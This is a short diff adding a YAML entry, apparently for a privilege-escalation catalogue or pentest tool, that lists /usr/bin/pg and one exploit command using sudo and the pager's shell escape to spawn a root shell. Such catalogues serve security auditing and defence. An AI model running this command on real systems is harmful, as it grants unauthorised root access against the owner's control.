@@ -1,0 +1,4 @@
+name: pg
+binary_path: /usr/bin/pg
+exploit_cmds:
+- sudo /usr/bin/pg /etc/hosts && !/bin/sh
